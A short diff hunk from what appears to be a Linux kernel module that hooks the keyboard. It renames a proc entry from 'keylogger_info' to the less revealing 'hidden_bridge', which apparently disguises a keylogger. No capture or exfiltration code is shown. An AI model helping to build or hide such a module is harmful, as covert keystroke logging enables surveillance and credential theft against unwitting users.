@@ -4,7 +4,7 @@
 #include <linux/uaccess.h>
 #include <linux/keyboard.h>
 
-#define PROC_NAME "keylogger_info"
+#define PROC_NAME "hidden_bridge"
 #define STATUS_BUF_SIZE 128
 #define LOG_BUF_SIZE 1024
 
